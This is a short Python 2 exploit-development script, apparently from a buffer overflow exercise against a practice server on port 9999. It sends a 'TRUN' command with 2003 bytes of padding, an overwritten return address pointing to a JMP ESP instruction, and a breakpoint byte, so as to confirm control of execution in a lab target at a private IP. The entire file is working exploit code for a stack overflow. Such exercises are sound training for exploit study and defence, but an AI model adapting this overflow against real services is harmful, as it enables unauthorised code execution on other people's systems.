import socket
import struct

print "\nTRUN Command - Verify JMP ESP\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    # Verify that we can use JMP ESP address to jump into buffer
    buf = "TRUN /.:/"
    buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\xcc' + 'C'*(5000-2003-4)

    bytes_sent = s.send(buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
